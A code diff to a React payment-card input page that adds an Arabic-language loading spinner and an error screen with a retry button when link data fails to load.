@@ -31,7 +31,7 @@ const PaymentCardInput = () => {
   const { id } = useParams();
   const navigate = useNavigate();
   const { toast } = useToast();
-  const { data: linkData } = useLink(id);
+  const { data: linkData, isLoading, error } = useLink(id);
   
   const [cardName, setCardName] = useState("");
   const [cardNumber, setCardNumber] = useState("");
@@ -55,6 +55,29 @@ const PaymentCardInput = () => {
 
   const shippingInfo = linkData?.payload as any;
   const paymentData = shippingInfo?.payment_data;
+
+  if (isLoading) {
+    return (
+      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
+        <div className="text-center p-8">
+          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-primary mx-auto mb-4"></div>
+          <p className="text-lg">جاري التحميل...</p>
+        </div>
+      </div>
+    );
+  }
+  
+  if (error || !linkData) {
+    return (
+      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
+        <div className="text-center p-8">
+          <h2 className="text-2xl font-bold mb-2">خطأ في تحميل البيانات</h2>
+          <p className="text-muted-foreground mb-6">الرجاء التحقق من الرابط والمحاولة مرة أخرى</p>
+          <Button onClick={() => window.location.reload()}>إعادة المحاولة</Button>
+        </div>
+      </div>
+    );
+  }
 
   // Get amount from link data - prioritize payment_data amount, then payment_amount, then cod_amount
   const rawAmount = paymentData?.payment_amount || shippingInfo?.payment_amount || shippingInfo?.cod_amount;
